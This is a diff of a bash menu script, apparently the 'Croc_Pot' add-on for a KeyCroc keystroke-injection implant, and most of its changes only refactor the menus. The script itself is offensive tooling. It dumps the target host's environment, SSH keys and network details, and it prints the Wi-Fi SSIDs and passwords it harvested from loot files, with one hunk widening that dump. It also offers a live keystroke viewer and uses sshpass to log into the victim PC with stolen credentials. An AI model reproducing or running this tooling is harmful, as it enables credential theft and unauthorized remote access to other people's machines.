+IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nPUBLIC IP: $(curl ifconfig.co)\nMAC ADDRESS: $(ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}')\n${LINE}\nVARIABLES CURRENT USER:\n$(env)\n${LINE}\n
 INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /tmp/mode)\nSSH: root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nDNS: $(sed -n -e 4p /etc/resolv.conf)\nDNS: $(sed -n -e 5p /etc/resolv.conf)\nDISPLAY ARP: $(ip n)\n${LINE}\nROUTE TALBE: $(ip r)\nNETWORK:\n$(ifconfig -a)\n${LINE}\nSYSTEM UPTIME: $(uptime)\n
 SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(lsusb -v)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
 MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
@@ -1207,8 +1196,8 @@ $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
 $(ColorYellow 'Pc user name is:') $(sed -n 7p ${CROC_OS_WIND})
 $(ColorYellow 'Pc IP is:') $(sed -n 4p ${CROC_OS_WIND})
-$(ColorYellow 'Pc SSID and PASSWD is:')
-$(sed -n 7p ${CROC_OS_WIND}) $(sed -n 4p ${CROC_OS_WIND})\n"
+$(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
+$(sed '9,24!d' ${CROC_OS_WIND})\n"
 else
     if [ "${OS_CHECK}" = LINUX ]; then
     croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
@@ -1217,8 +1206,8 @@ $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
 $(ColorYellow 'Pc user name is:') $(sed -n 1p ${croc_os_v})
 $(ColorYellow 'Pc IP is:') $(sed -n 2p ${croc_os_v})
-$(ColorYellow 'Pc SSID and PASSWD is:') 
-$(sed -n 3p ${croc_os_v}) $(sed -n 4p ${croc_os_v})\n"
+$(ColorYellow 'Pc SSID + PASSWD and MAC address is:') 
+$(sed '3,9!d' ${croc_os_v})\n"
 else
     echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')"
  fi
@@ -1243,19 +1232,17 @@ keystorkes_V() {
 
 menu_A() {
 	LED B
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mKEYCROC STATUS MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mMEMORY USAGE             ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mCPU LOAD                 ${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mNUMBER OF TCP CONNECTIONS${clear}
-\t\t\t\e[40;1m4${clear}${green})${clear}\e[41;4;30mKERNEL VERSION           ${clear}
-\t\t\t\e[40;1m5${clear}${green})${clear}\e[41;4;30mRUNNING PROCESSES        ${clear}
-\t\t\t\e[40;1m6${clear}${green})${clear}\e[41;4;30mCHECK ALL                ${clear}
-\t\t\t\e[40;1m7${clear}${green})${clear}\e[41;4;30mCONNECTED PC INFO        ${clear}
-\t\t\t\e[40;1m8${clear}${green})${clear}\e[41;4;30mVIEW LIVE KEYSTORKES     ${clear}
-\t\t\t\e[40;1m9${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU      ${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;93;4;1mEXIT                     ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:  ') ${clear}"
+MenuTitle KEYCROC STATUS MENU
+MenuColor 1 MEMORY USAGE___________
+MenuColor 2 CPU LOAD_______________
+MenuColor 3 NUMBER OF TCP CONNECTIONS
+MenuColor 4 KERNEL VERSION_________
+MenuColor 5 RUNNING PROCESSES______
+MenuColor 6 CHECK ALL______________
+MenuColor 7 CONNECTED PC INFO_______
+MenuColor 8 VIEW LIVE KEYSTORKES____
+MenuColor 9 RETURN TO MAIN MENU______
+MenuEnd
         read a_c
         case $a_c in
         1) memory_check ; menu_A ;;
@@ -1397,20 +1384,18 @@ fi
 ##
 			
 	LED B
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mCROC EDIT MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m 1${clear}${green})${clear}\e[41;4;30mCROC PAYLOADS FOLDER  ${clear}
-\t\t\t\e[40;1m 2${clear}${green})${clear}\e[41;4;30mCROC TOOLS FOLDER     ${clear}
-\t\t\t\e[40;1m 3${clear}${green})${clear}\e[41;4;30mCROC LOOT FOLDER      ${clear}
-\t\t\t\e[40;1m 4${clear}${green})${clear}\e[41;4;30mCROC CONFIG fILE      ${clear}
-\t\t\t\e[40;1m 5${clear}${green})${clear}\e[41;4;30mCROC ENTER FILE NAME  ${clear}
-\t\t\t\e[40;1m 6${clear}${green})${clear}\e[41;4;30mCROC REMOVE FILES     ${clear}
-\t\t\t\e[40;1m 7${clear}${green})${clear}\e[41;4;30mATTACKMODE HID STORAGE${clear}
-\t\t\t\e[40;1m 8${clear}${green})${clear}\e[41;4;30mATTACKMODE HID        ${clear}
-\t\t\t\e[40;1m 9${clear}${green})${clear}\e[41;4;30mRELOAD_PAYLOADS       ${clear}
-\t\t\t\e[40;1m10${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU   ${clear}
-\t\t\t\e[40;1m 0${clear}${green})${clear}\e[41;4;93;4;1mEXIT                  ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle CROC EDIT MENU
+MenuColor  1 CROC PAYLOADS FOLDER__
+MenuColor  2 CROC TOOLS FOLDER_____
+MenuColor  3 CROC LOOT FOLDER______
+MenuColor  4 CROC CONFIG fILE______
+MenuColor  5 CROC ENTER FILE NAME___
+MenuColor  6 CROC REMOVE FILES_____
+MenuColor  7 ATTACKMODE HID STORAGE
+MenuColor  8 ATTACKMODE HID_______
+MenuColor  9 RELOAD_PAYLOADS_____
+MenuColor 10 RETURN TO MAIN MENU___
+MenuEnd
         read a_b
         case $a_b in
         1) edit_payload ; croc_edit_menu ;;
@@ -1422,7 +1407,7 @@ echo -ne "
         7) ATTACKMODE HID STORAGE ; croc_edit_menu ;;
         8) ATTACKMODE HID ; croc_edit_menu ;;
         9) RELOAD_PAYLOADS ; croc_edit_menu ;;
-        10) main_menu ;;
+       10) main_menu ;;
         0) exit 0 ;;
         *) invalid_entry ; croc_edit_menu ;;
         esac
@@ -1502,7 +1487,7 @@ echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_V})
 \t$(ColorGreen 'Starting SSH with connected PC')\n"
     sshpass -p $(sed '$!d' ${pw_check}) ssh $(sed -n 1p ${CROC_OS_V})@$(sed -n 2p ${CROC_OS_V})
 else
-	  echo -ne "\e[40;4;5m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET USER NAME AND IP')${clear}"
+	echo -ne "\e[40;4;5m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET USER NAME AND IP')${clear}"
 	fi
 fi
 }
@@ -1529,7 +1514,7 @@ ssh_shell() {
 else
     if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
     echo -ne "\e[40;4;5m$(ColorRed 'USING WIFI PINEAPPLE DEFAULT IP 172.16.42.1')${clear}"
-	  sshpass -p $(sed -n 1p ${hak_gear}) ssh root@172.16.42.1
+	sshpass -p $(sed -n 1p ${hak_gear}) ssh root@172.16.42.1
 else
     pw_list
  fi
@@ -1589,20 +1574,18 @@ fi
 #   - SSH wifi pineapple menu
 ##
 
-echo -ne "
-\t\t\e[40;31;1m${LINE_}${clear}\e[40;4;1mWIFI PINEAPPLE MENU${clear}\e[40;31;1m${LINE_}${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mSSH PINEAPPLE      ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mPINEAPPLE WEB      ${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;32;1mEXIT               ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle WIFI PINEAPPLE MENU
+MenuColor 1 SSH PINEAPPLE____
+MenuColor 2 PINEAPPLE WEB____
+MenuColor 3 RETURN TO MAIN MENU
+MenuEnd
         read w_p
         case $w_p in
-	    1) ssh_shell ; ssh_menu ;;
-	    2) pine_web ; ssh_menu ;;
-	    3) main_menu ;;
-		  0) exit 0 ;;
-		  *) invalid_entry ; ssh_menu ;;
+	1) ssh_shell ; ssh_menu ;;
+	2) pine_web ; ssh_menu ;;
+	3) main_menu ;;
+	0) exit 0 ;;
+	*) invalid_entry ; ssh_menu ;;
         esac
 }
 
@@ -1753,36 +1736,34 @@ fi
 ##
 	
 	LED B
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mCROC SSH MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m 1${clear}${green})${clear}\e[41;4;30mSTART SSH WITH CONNECT PC${clear}
-\t\t\t\e[40;1m 2${clear}${green})${clear}\e[41;4;30mSTART SSH WITH USER INPUT${clear}
-\t\t\t\e[40;1m 3${clear}${green})${clear}\e[41;4;30mENABLE_SSH               ${clear}
-\t\t\t\e[40;1m 4${clear}${green})${clear}\e[41;4;30mDISABLE_SSH              ${clear}
-\t\t\t\e[40;1m 5${clear}${green})${clear}\e[41;4;30mWIFI PINEAPPLE           ${clear}
-\t\t\t\e[40;1m 6${clear}${green})${clear}\e[41;4;30mPACKET SQUIRREL          ${clear}
-\t\t\t\e[40;1m 7${clear}${green})${clear}\e[41;4;30mLAN TURTLE               ${clear}
-\t\t\t\e[40;1m 8${clear}${green})${clear}\e[41;4;30mSIGNAL OWL               ${clear}
-\t\t\t\e[40;1m 9${clear}${green})${clear}\e[41;4;30mSHARK JACK               ${clear}
-\t\t\t\e[40;1m10${clear}${green})${clear}\e[41;4;30mBASH BUNNY               ${clear}
-\t\t\t\e[40;1m11${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU      ${clear}
-\t\t\t\e[40;1m 0${clear}${green})${clear}\e[41;4;93;4;1mEXIT                     ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle CROC SSH MENU
+MenuColor  1 START SSH WITH CONNECT PC
+MenuColor  2 START SSH WITH USER INPUT
+MenuColor  3 ENABLE_SSH___________
+MenuColor  4 DISABLE_SSH__________
+MenuColor  5 WIFI PINEAPPLE________
+MenuColor  6 PACKET SQUIRREL_______
+MenuColor  7 LAN TURTLE____________
+MenuColor  8 SIGNAL OWL____________
+MenuColor  9 SHARK JACK____________
+MenuColor 10 BASH BUNNY___________
+MenuColor 11 RETURN TO MAIN MENU____
+MenuEnd
         read ssh_a
         case $ssh_a in
-	    1) pc_ssh ; ssh_menu ;;
-	    2) userinput_ssh ; ssh_menu ;;
-	    3) ENABLE_SSH ; ssh_menu ;;
-	    4) DISABLE_SSH ; ssh_menu ;;
-		  5) ssh_pineapple ; ssh_menu ;;
-		  6) ssh_squirrel ; ssh_menu ;;
-		  7) ssh_turtle ; ssh_menu ;;
-		  8) ssh_owl ; ssh_menu ;;
-		  9) ssh_shark ; ssh_menu ;;
-		  10) ssh_bunny ; ssh_menu ;;
-		  11) main_menu ;;
-		  0) exit 0 ;;
-		  *) invalid_entry ; ssh_menu ;;
+	1) pc_ssh ; ssh_menu ;;
+	2) userinput_ssh ; ssh_menu ;;
+	3) ENABLE_SSH ; ssh_menu ;;
+	4) DISABLE_SSH ; ssh_menu ;;
+	5) ssh_pineapple ; ssh_menu ;;
+	6) ssh_squirrel ; ssh_menu ;;
+	7) ssh_turtle ; ssh_menu ;;
+	8) ssh_owl ; ssh_menu ;;
+	9) ssh_shark ; ssh_menu ;;
+       10) ssh_bunny ; ssh_menu ;;
+       11) main_menu ;;
+	0) exit 0 ;;
+	*) invalid_entry ; ssh_menu ;;
         esac
 }
 
@@ -1794,26 +1775,24 @@ function main_menu() {
 	LED B
 	clear
 	croc_title
-echo -ne "
-\t\t\t\e[40;4;1mCROC POT MAIN MENU${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mCROC MAIL     ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mCROC POT PLUS ${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mKEYCROC STATUS${clear}
-\t\t\t\e[40;1m4${clear}${green})${clear}\e[41;4;30mKEYCROC LOGS  ${clear}
-\t\t\t\e[40;1m5${clear}${green})${clear}\e[41;4;30mKEYCROC EDIT  ${clear}
-\t\t\t\e[40;1m6${clear}${green})${clear}\e[41;4;30mSSH MENU      ${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;32;1mEXIT          ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle CROC POT MAIN MENU
+MenuColor 1 CROC MAIL_____
+MenuColor 2 CROC POT PLUS__
+MenuColor 3 KEYCROC STATUS
+MenuColor 4 KEYCROC LOGS__
+MenuColor 5 KEYCROC EDIT__
+MenuColor 6 SSH MENU______
+MenuEnd
         read a
         case $a in
-	    1) croc_mail ;;
-	    2) croc_pot_plus ;;
-	    3) croc_status ;;
-	    4) croc_logs_mean ;;
-	    5) croc_edit_menu ;;
-	    6) ssh_menu ;;
-		  0) exit 0 ;;
-		  *) invalid_entry ; main_menu ;;
+	1) croc_mail ;;
+	2) croc_pot_plus ;;
+	3) croc_status ;;
+	4) croc_logs_mean ;;
+	5) croc_edit_menu ;;
+	6) ssh_menu ;;
+	0) exit 0 ;;
+	*) invalid_entry ; main_menu ;;
         esac
 }
 main_menu
